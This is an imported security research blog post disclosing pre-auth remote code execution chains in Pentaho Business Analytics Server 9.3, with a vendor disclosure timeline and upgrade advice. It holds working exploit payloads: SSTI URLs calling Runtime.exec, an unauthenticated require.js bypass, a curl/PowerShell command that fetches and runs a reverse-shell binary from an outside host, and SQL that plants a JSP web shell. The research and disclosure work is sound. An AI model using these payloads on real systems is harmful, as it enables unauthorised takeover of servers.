---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-04-04_pentah0wnage-pre-auth-rce-in-pentaho-business-analytics-server.md
original_filename: 2023-04-04_pentah0wnage-pre-auth-rce-in-pentaho-business-analytics-server.md
title: 'Pentah0wnage: Pre-Auth RCE in Pentaho Business Analytics Server'
category: documents
detected_topics:
- access-control
- xss
- api-security
- sso
- sqli
- command-injection
tags:
- imported
- documents
- access-control
- xss
- api-security
- sso
- sqli
- command-injection
language: en
raw_sha256: a414180a0ab56db79fb68cc3aff73d83a6a6533905c60feb71579154acf76e5d
text_sha256: a216a80d5ea4d7b575230788edd85937b1bf6e792ffbde7dcf0811fe8e717b2d
ingested_at: '2026-06-28T07:32:20Z'
sensitivity: unknown
redactions_applied: true
---

# Pentah0wnage: Pre-Auth RCE in Pentaho Business Analytics Server

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-04-04_pentah0wnage-pre-auth-rce-in-pentaho-business-analytics-server.md
- Source Type: markdown
- Detected Topics: access-control, xss, api-security, sso, sqli, command-injection
- Ingested At: 2026-06-28T07:32:20Z
- Redactions Applied: True
- Raw SHA256: `a414180a0ab56db79fb68cc3aff73d83a6a6533905c60feb71579154acf76e5d`
- Text SHA256: `a216a80d5ea4d7b575230788edd85937b1bf6e792ffbde7dcf0811fe8e717b2d`


## Content

---
title: "Pentah0wnage: Pre-Auth RCE in Pentaho Business Analytics Server"
page_title: "Pentah0wnage: Pre-Auth RCE in Pentaho Business Analytics Server · Aura Research Division"
url: "https://research.aurainfosec.io/pentest/pentah0wnage/"
final_url: "https://research.aurainfosec.io/pentest/pentah0wnage/"
authors: ["Harry Withington"]
programs: ["Hitachi Vantara (Pentaho)"]
bugs: ["RCE", "SSTI", "Authorization bypass", "Groovy scripting"]
publication_date: "2023-04-04"
added_date: "2023-04-06"
source: "pentester.land/writeups.json"
original_index: 1303
---

![Pentah0wnage: Pre-Auth RCE in Pentaho Business Analytics Server](/pentest/pentah0wnage/feature.png)

# Pentah0wnage: Pre-Auth RCE in Pentaho Business Analytics Server

4 April 2023

[Harry Withington](/authors/harry-withington/)

## Background

#

[Pentaho Business Analytics Server](https://en.wikipedia.org/wiki/Pentaho) is a business intelligence and data analytics platform written in Java.

It’s used across a wide range of industries, including education, government and healthcare. It was developed independently until 2015, when it was bought by Hitachi Vantara (a subsidiary of Hitachi).

![](/content/blog/pentest/pentah0wnage/google-search-result.png)

A few months ago I was working on an engagement where Pentaho was used to collect data and generate reports. After discovering and exploiting [CVE-2022-43773](https://www.cve.org/CVERecord?id=CVE-2022-43773), I learned that this was actually possible by default and all instances of Pentaho were affected. Using time in between jobs and Aura’s dedicated research time I decided to take a deep dive in to Pentaho and see what else I could find.

I found a total of eight vulnerabilties, three of which enable command execution on the residing host. All have been disclosed to the vendor, and the most interesting of these are explored below.

## Vulnerabilities

#

### [CVE-2022-43769](https://www.cve.org/CVERecord?id=CVE-2022-43769) \- Server-Side Template Injection in LDAP API Endpoints

#

Pentaho offers a few endpoints where administrators can configure and test LDAP connections. This is done by creating an XML-based bean definition along with a referenced properties file containing user-provided parameters. However, user input isn’t sanitised before reaching the included properties file, allowing all kinds of fun things to be injected and parsed. This includes [Thymeleaf](https://www.thymeleaf.org) templates.

Thymeleaf Templates are typically used to generate or reference dynamic content based on user input, but can also be used to execute methods associated with Java classes directly. This includes the `(java.lang.Runtime).getRuntime().exec()` method, which runs a command on the executing host.

By including the `(java.lang.Runtime).getRuntime().exec()` method within the generated properties file, the template is parsed and commands can be executed.
  
  
  http://127.0.0.1:8080/pentaho/api/ldap/config/ldapTreeNodeChildren/?url=%23{T(java.lang.Runtime).getRuntime().exec('notepad.exe')}&mgrDn=a&pwd=***REDACTED***

Great! Now I can write all kinds of things.

_But... shell... I can haz?_

You can! 🐚

Pentaho, meet [RSSH](https://github.com/NHAS/reverse_ssh).

RSSH was developed by Aura’s own Jordan Smith / [NHAS](https://github.com/NHAS), and provides an intuitive and easy-to-understand interface for managing cross-platform remote clients. It has full parity with SSH, making things like port-forwarding and proxying straight-forward.
  
  
  # Start RSSH with --webserver
  ./server --webserver --external_address 192.168.160.1:3000 :3000
  
  # Generate Windows exe
  ssh localhost -p 3001
  link --name win --goos windows
  
  # Grab it and execute via powershell
  curl 'http://127.0.0.1:8080/pentaho/api/ldap/config/ldapTreeNodeChildren/require.js?url=%23\{T(java.lang.Runtime).getRuntime().exec(%27powershell+%22wget+192.168.160.1:3000/win+-o+$env:TEMP/rssh.exe+;start-process+$env:TEMP/rssh.exe%22%27)\}&mgrDn=a&pwd=***REDACTED*** --cookie 'JSESSIONID=<JSESSIONID OF ADMIN>'

Unfortunately, creating and testing LDAP connections requires admin access, meaning an attacker would already have to achieved significant compromise before exploiting this. If only there were some way around this.

### [CVE-2022-43939](https://www.cve.org/CVERecord?id=CVE-2022-43939) \- Require.js Authorisation Bypass

#

Pentaho uses different authorisation checks for each type of endpoint, but the checks for restricting unauthenticated access are primarily done through `applicationContext-spring-security.xml`. This has various regular expressions which separate access for unauthenticated, authenticated and administrative users.

One notable regex is defined here:
  
  
  334 | <sec:intercept-url pattern="\A/[^\?]*(require)(-js)?(-cfg)?.js(\?.*)?\Z" access="Anonymous,Authenticated" />

This allows anonymous (unauthenticated) users access to any endpoint ending in `/require.js`. While this breaks almost everything, there’s one place it’s ignored. Can you guess what it is?
  
  
  http://127.0.0.1:8080/pentaho/api/ldap/config/ldapTreeNodeChildren/require.js?url=%23{T(java.lang.Runtime).getRuntime().exec('notepad.exe')}&mgrDn=a&pwd=***REDACTED***

Using [CVE-2022-43939](https://www.cve.org/CVERecord?id=CVE-2022-43939), exploitation of [CVE-2022-43769](https://www.cve.org/CVERecord?id=CVE-2022-43769) is possible as an unauthenticated user.

### [CVE-2022-43773](https://www.cve.org/CVERecord?id=CVE-2022-43773) \- RCE via HSQLDB Interaction

#

HyperSQL DB (HSQLDB) is a database system written in Java. It has tight integrations with Java, to the point where you can call Java gadgets directly though created procedures. This is important because some Java gadgets can do interesting things, such as writing binary data to a file using:
  
  
  com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename

Because Pentaho runs on Tomcat, any `.jsp` files written in the defined webroot directories are parsed and executed when browsed directly.

Basically, if you can write to a file in the webroot you can execute code, and any unrestricted SQL on HSQLDB means you can write to a file.

So, how can we abuse this?
  
  
  DROP PROCEDURE writetofile IF EXISTS;CREATE PROCEDURE writetofile(IN paramString VARCHAR(1024), IN paramArrayOfByte VARBINARY(1024)) LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename';call writetofile('../webapps/pentaho/shell.jsp', cast ('3c2540207061676520696d706f72743d226a6176612e696f2e496e70757453747265616d2220253e0a3c2540207061676520636f6e74656e74547970653d22746578742f68746d6c3b636861727365743d5554462d3822206c616e67756167653d226a6176612220253e0a3c250a52756e74696d652e67657452756e74696d6528292e6578656328226e6f74657061642e65786522292e676574496e70757453747265616d28293b0a253e' AS VARBINARY(1024)))

This will create the `writetofile` procedure which will write provided data to a specified file on the filesystem. It then runs this procedure, writing the hex-formatted data to the default webroot directory served by Tomcat.

The data contained within the `cast` function is hex-formatted JSP which executes `notepad.exe`.
  
  
  <%@ page import="java.io.InputStream" %>
  <%@ page contentType="text/html;charset=UTF-8" language="java" %>
  <%
  Runtime.getRuntime().exec("notepad.exe").getInputStream();
  %>

_But how would I execute this? Don’t I need SQLi?_

Luckily, we don’t even need to bother with injection. Pentaho offers numerous ways of running custom SQL, even as a low-privilege user.

Administrators can do it via the Data Source Wizard. Just change the user to `pentaho_admin`, add the SQL to the connection properties, and interact with the datasource - it’ll execute, and the file will get written.

![manage data sources](/content/blog/pentest/pentah0wnage/managedatasources.png)

![edit connection](/content/blog/pentest/pentah0wnage/editconnection.png)

![add sql](/content/blog/pentest/pentah0wnage/addsql.png)

Low-privilege users can also do it by creating a report in the Pentaho Report Designer and adding a query.

![Report Designer JDBC](/content/blog/pentest/pentah0wnage/repdesignerjdbc.png)

![Change User](/content/blog/pentest/pentah0wnage/makeadmin.png)

![Report Designer Query](/content/blog/pentest/pentah0wnage/writeshellquery.png)

![Adding Element](/content/blog/pentest/pentah0wnage/addingelement.png)

When this gets uploaded, all included queries are executed server-side, causing the jsp file to be written.

### [CVE-2022-43938](https://www.cve.org/CVERecord?id=CVE-2022-43938) \- RCE via Groovy Scripting

#

Don’t feel like messing around with all this ‘SQL’ mumbo jumbo? Get Groovy 🕺

Reports created in the Pentaho Report Designer allow scripts to be executed as part of datasource queries. Notably, this includes [Groovy scripting](https://groovy-lang.org/). Groovy implements the `execute()` function, which runs a command on the residing host.

Again, since all included scripts/queries are executed server-side once uploaded, this means the Groovy script is executed on the server when the report is opened.

## Conclusion

#

All three of the identified issues allow an attacker to gain complete control of the backend host. Two are possible utilising an account with minimal privileges and one without any authentication at all.

Users shouldn’t have nearly as much control over datasources or SQL as they do, and Groovy scripting should have never been enabled in the first place.

I haven’t confirmed these for versions other than `9.3.0.0-428`, but all of the identified issues are likely to have been around for a while.

There were a few other less impactful vulnerabilities I found, including:

  * [CVE-2022-43940](https://www.cve.org/CVERecord?id=CVE-2022-43940) \- Broken Webservice Access Controls
  * [CVE-2022-43771](https://www.cve.org/CVERecord?id=CVE-2022-43771) \- Directory Traversal
  * [CVE-2022-43941](https://www.cve.org/CVERecord?id=CVE-2022-43941) \- XML External Entity Injection (XXE) in Mondrian Analytics
  * [CVE-2022-3960](https://www.cve.org/CVERecord?id=CVE-2022-3960) \- Stored Cross-Site Scripting (XSS) in CDE Dashboards

Hitachi Vantara’s [official disclosure policy](https://knowledge.hitachivantara.com/Security/Hitachi_Vantara_Vulnerability_Disclosure_Policy) is to go through their generic support system. I followed this process, however it wasn’t successful. After following up and connecting with their security team directly, I was able to disclose and confirm the identified issues.

## Timeline

#

Here’s a disclosure timeline:

  1. ### Initial Attempt to Contact Vendor

20 October 2022

Contacted the Hitachi Vantara support team saying I'd identified a few vulnerabilities.

  2. ### Initial Contact with Security Team

22 October 2022

Bounced around the support team until I was put in contact with someone from a third-party. Finally got in contact with security team directly.

  3. ### Vulnerability Disclosure

25 October 2022

Disclosed all identified issues and began the 90 day disclosure period.

  4. ### Vendor Update

12 November 2022

Update from vendor that the issues were being tracked and CVEs assigned. Requested timeline but got no response.

  5. ### Vulnerability Disclosure Update

10 January 2023

Reiterated that the 90 day disclosure period would end on the 23rd. Received no response from the vendor.

  6. ### Request Vendor Update

1 February 2023

Requested an update from the vendor. Advised that patches will be released in March.

  7. ### Patches?

15 March 2023

No patches released by vendor. Reminded the vendor of the original 90 day disclosure period which had already lapsed.

  8. ### Vendor Update - Patches

17 March 2023

Vendor advises that patches will be released on the 31st of March 2023.

  9. ### Patches!

31 March 2023

Vendor released patches, but no public CVE disclosure.

  10. ### Public Disclosure

4 April 2023

CVE disclosure via MITRE and blog posted.

The overall disclosure process was fairly challenging and could be improved by having a well defined vulnerability disclosure program / policy.

For people using Pentaho:

  * Upgrade to 9.3.0.3 / 9.4.0.1

Proof-of-concepts can be found in the GitHub repo below:

[dwbzn/pentaho-exploitsPython82](https://github.com/dwbzn/pentaho-exploits)

Efficacy of the patches provided by the vendor have not yet been validated.

## Disclaimer

#

The information in this article is provided for research and educational purposes only. Aura Information Security does not accept any liability in any form for any direct or indirect damages resulting from the use of or reliance on the information contained in this article.

![ Author](/img/authors/harry_hu_f492f4a088d4983a.png)

Author

Harry Withington

Security Consultant.

[ ](https://twitter.com/dwbzn "X-Twitter")[ ](https://github.com/dwbzn "Github")[](https://www.linkedin.com/in/harry-withington/ "Linkedin")

[ ](https://www.linkedin.com/shareArticle?mini=true&url=https://research.aurainfosec.io/pentest/pentah0wnage/&title=Pentah0wnage:%20Pre-Auth%20RCE%20in%20Pentaho%20Business%20Analytics%20Server "Share on LinkedIn")[ ](https://twitter.com/intent/tweet/?url=https://research.aurainfosec.io/pentest/pentah0wnage/&text=Pentah0wnage:%20Pre-Auth%20RCE%20in%20Pentaho%20Business%20Analytics%20Server "Tweet on Twitter")[ ](https://reddit.com/submit/?url=https://research.aurainfosec.io/pentest/pentah0wnage/&resubmit=true&title=Pentah0wnage:%20Pre-Auth%20RCE%20in%20Pentaho%20Business%20Analytics%20Server "Submit to Reddit")[ ](https://api.whatsapp.com/send?text=https://research.aurainfosec.io/pentest/pentah0wnage/&resubmit=true&title=Pentah0wnage:%20Pre-Auth%20RCE%20in%20Pentaho%20Business%20Analytics%20Server "Share via WhatsApp")[ ](https://t.me/share/url?url=https://research.aurainfosec.io/pentest/pentah0wnage/&resubmit=true&title=Pentah0wnage:%20Pre-Auth%20RCE%20in%20Pentaho%20Business%20Analytics%20Server "Share via Telegram")[ ](https://pinterest.com/pin/create/bookmarklet/?url=https://research.aurainfosec.io/pentest/pentah0wnage/&description=Pentah0wnage:%20Pre-Auth%20RCE%20in%20Pentaho%20Business%20Analytics%20Server "Pin on Pinterest")[ ](https://www.facebook.com/sharer/sharer.php?u=https://research.aurainfosec.io/pentest/pentah0wnage/&quote=Pentah0wnage:%20Pre-Auth%20RCE%20in%20Pentaho%20Business%20Analytics%20Server "Share on Facebook")[](mailto:?body=https://research.aurainfosec.io/pentest/pentah0wnage/&subject=Pentah0wnage:%20Pre-Auth%20RCE%20in%20Pentaho%20Business%20Analytics%20Server "Send via email")
